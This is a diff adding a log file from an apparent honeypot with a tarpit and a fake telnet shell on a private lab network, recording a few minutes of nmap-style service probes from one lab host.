@@ -1,0 +1,461 @@
+2026-07-21 16:51:06 | INFO    | hvedrungr.main | Starting Hveðrungr…
+2026-07-21 16:51:06 | INFO    | hvedrungr.narfa | Narfa fjöturr listening on 192.168.56.10:2222 (delay 1.00s/byte)
+2026-07-21 16:51:06 | INFO    | hvedrungr.main | All modules started (2). Press Ctrl+C to stop.
+2026-07-21 16:51:06 | INFO    | hvedrungr.lokanet | Lokanet shell listening on 192.168.56.10:2323
+2026-07-21 16:53:38 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:43878 — entering tarpit
+2026-07-21 16:53:38 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:41444
+2026-07-21 16:53:38 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:53:38 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:53:38 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:53:38 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=0.0s
+2026-07-21 16:53:38 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:53:38 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=0.0s
+2026-07-21 16:53:38 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:43892 — entering tarpit
+2026-07-21 16:53:38 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:41448
+2026-07-21 16:53:38 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:53:38 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:53:49 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:60670 — entering tarpit
+2026-07-21 16:53:49 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:55962
+2026-07-21 16:53:49 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:53:49 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:53:49 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:53:49 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:53:49 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:53:50 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:53:50 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=12.01s
+2026-07-21 16:53:50 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=12.01s
+2026-07-21 16:53:54 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:43720
+2026-07-21 16:53:54 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:53:54 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:48020 — entering tarpit
+2026-07-21 16:53:54 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:53:54 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:53:54 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='GET / HTTP/1.0' password=''
+2026-07-21 16:53:55 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:53:55 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:53:55 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:53:59 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:48028 — entering tarpit
+2026-07-21 16:53:59 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:43734
+2026-07-21 16:53:59 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:53:59 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:53:59 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:53:59 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='OPTIONS / HTTP/1.0' password=''
+2026-07-21 16:54:00 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:00 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:54:00 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:54:04 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:55378
+2026-07-21 16:54:04 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:57930 — entering tarpit
+2026-07-21 16:54:04 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:54:04 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:04 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:04 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='OPTIONS / RTSP/1.0' password=''
+2026-07-21 16:54:05 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:05 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.0s
+2026-07-21 16:54:05 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:54:09 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:57946 — entering tarpit
+2026-07-21 16:54:09 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:55386
+2026-07-21 16:54:09 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:09 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:09 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:54:10 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:10 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:54:10 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:54:14 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:46068
+2026-07-21 16:54:14 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:58622 — entering tarpit
+2026-07-21 16:54:14 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:54:14 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:14 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:14 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:54:15 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:15 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:54:15 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:54:19 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:54:19 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:54:19 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:46080
+2026-07-21 16:54:19 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:19 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:58634 — entering tarpit
+2026-07-21 16:54:19 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:20 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:20 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:54:20 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:54:24 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:54:24 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:54:24 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:41124
+2026-07-21 16:54:24 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:27 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:52222 — entering tarpit
+2026-07-21 16:54:27 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:28 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:28 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=9.0s
+2026-07-21 16:54:28 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=9.0s
+2026-07-21 16:54:32 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:60818
+2026-07-21 16:54:32 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='EHLO' password=''
+2026-07-21 16:54:32 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:32 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:54:34 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:44848 — entering tarpit
+2026-07-21 16:54:34 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:36 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:36 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=9.01s
+2026-07-21 16:54:36 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=9.01s
+2026-07-21 16:54:39 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:44856 — entering tarpit
+2026-07-21 16:54:39 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:60822
+2026-07-21 16:54:39 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='HELP' password=''
+2026-07-21 16:54:39 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:39 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:39 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:54:40 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:40 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:54:40 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:54:44 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:35684 — entering tarpit
+2026-07-21 16:54:44 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:44404
+2026-07-21 16:54:44 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='    S   O  ?G,`~ {Ֆw' password=''
+2026-07-21 16:54:44 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:44 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:44 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:54:45 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:45 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.04s
+2026-07-21 16:54:45 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.04s
+2026-07-21 16:54:49 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:44418
+2026-07-21 16:54:49 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='   *%     Cookie: mstshash=nmap' password=''
+2026-07-21 16:54:49 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:35690 — entering tarpit
+2026-07-21 16:54:49 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:49 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:54:49 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='    i   e  U random1random2ran' password='  9      0  '
+2026-07-21 16:54:49 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:50 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:50 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:54:50 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.02s
+2026-07-21 16:54:54 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:54:54 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:35716 — entering tarpit
+2026-07-21 16:54:54 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:48300
+2026-07-21 16:54:54 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:54 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:55 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:54:55 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.02s
+2026-07-21 16:54:55 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.02s
+2026-07-21 16:54:59 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:35720 — entering tarpit
+2026-07-21 16:54:59 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:48306
+2026-07-21 16:54:59 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='    u      f  e  d  c  b  :  9' password=''
+2026-07-21 16:54:59 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:54:59 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:54:59 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:00 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:00 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:55:00 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:55:04 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:54740
+2026-07-21 16:55:04 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:43276 — entering tarpit
+2026-07-21 16:55:04 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='   qjn0k       ' password=''
+2026-07-21 16:55:04 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:04 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:04 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:05 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:05 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:55:05 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:55:09 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:43284 — entering tarpit
+2026-07-21 16:55:09 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:54750
+2026-07-21 16:55:09 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:55:09 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:09 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:09 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:10 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:10 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:55:10 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:55:14 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:55:14 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:14 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:60188
+2026-07-21 16:55:14 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:48878 — entering tarpit
+2026-07-21 16:55:14 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:14 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:14 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='GET /nice%20ports%2C/Tri%6Eity.t' password=''
+2026-07-21 16:55:15 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:15 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.02s
+2026-07-21 16:55:15 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.02s
+2026-07-21 16:55:19 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:19 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:60198
+2026-07-21 16:55:19 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:19 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:48894 — entering tarpit
+2026-07-21 16:55:19 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:20 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:20 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:55:20 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:55:24 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login=' default' password=''
+2026-07-21 16:55:24 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:57888 — entering tarpit
+2026-07-21 16:55:24 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:59724
+2026-07-21 16:55:24 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:24 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:24 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:24 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='0   -   c   $   ' password='  '
+2026-07-21 16:55:25 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:25 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:55:25 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:55:29 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:29 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:57896 — entering tarpit
+2026-07-21 16:55:29 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:59728
+2026-07-21 16:55:29 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:29 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:30 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:30 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:55:30 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:55:34 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:39346
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='OPTIONS sip:nm SIP/2.0' password='Via: SIP/2.0/TCP nm;branch=foo'
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | From: <sip:nm@nm>;tag=root
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | To: <sip:nm2@nm2>
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | Call-ID: 50000
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | CSeq: 42 OPTIONS
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | Max-Forwards: 70
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | Content-Length: 0
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | Contact: <sip:nm@nm>
+2026-07-21 16:55:34 | INFO    | hvedrungr | [lokanet] command | src=192.168.56.20 | Accept: application/sdp
+2026-07-21 16:55:37 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:50134 — entering tarpit
+2026-07-21 16:55:37 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:38 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:38 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=9.01s
+2026-07-21 16:55:38 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=9.02s
+2026-07-21 16:55:42 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:37966 — entering tarpit
+2026-07-21 16:55:42 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:42 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:42 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:43652
+2026-07-21 16:55:42 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:43 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:43 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.0s
+2026-07-21 16:55:43 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:55:47 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:37968 — entering tarpit
+2026-07-21 16:55:47 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:55:47 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:43664
+2026-07-21 16:55:47 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:47 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:47 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:48 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:48 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:55:48 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:55:52 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:54636 — entering tarpit
+2026-07-21 16:55:52 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:50702
+2026-07-21 16:55:52 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:52 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:52 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:55:52 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:53 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:53 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.01s
+2026-07-21 16:55:53 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.01s
+2026-07-21 16:55:57 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:55:57 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:50712
+2026-07-21 16:55:57 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:55:57 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:54648 — entering tarpit
+2026-07-21 16:55:57 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:55:57 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:55:58 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:55:58 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.0s
+2026-07-21 16:55:58 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.0s
+2026-07-21 16:56:02 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:46730 — entering tarpit
+2026-07-21 16:56:02 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:39258
+2026-07-21 16:56:02 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:02 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:56:02 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:02 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:03 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
+2026-07-21 16:56:03 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | abort_during_banner; held=6.0s
+2026-07-21 16:56:03 | INFO    | hvedrungr | [narfa] session_end | src=192.168.56.20 | session_closed; held=6.0s
+2026-07-21 16:56:07 | INFO    | hvedrungr.lokanet | Lokanet: connection from 192.168.56.20:39260
+2026-07-21 16:56:07 | INFO    | hvedrungr.narfa | Connection from 192.168.56.20:46736 — entering tarpit
+2026-07-21 16:56:07 | INFO    | hvedrungr | [lokanet] connection | src=192.168.56.20 | telnet connect
+2026-07-21 16:56:07 | INFO    | hvedrungr | [lokanet] auth_attempt | src=192.168.56.20 | login='' password=''
+2026-07-21 16:56:07 | INFO    | hvedrungr | [narfa] connection | src=192.168.56.20 | TCP connect — entering tarpit
+2026-07-21 16:56:07 | INFO    | hvedrungr | [lokanet] session_end | src=192.168.56.20 | shell closed
+2026-07-21 16:56:08 | INFO    | hvedrungr.narfa | Client 192.168.56.20 disconnected during banner
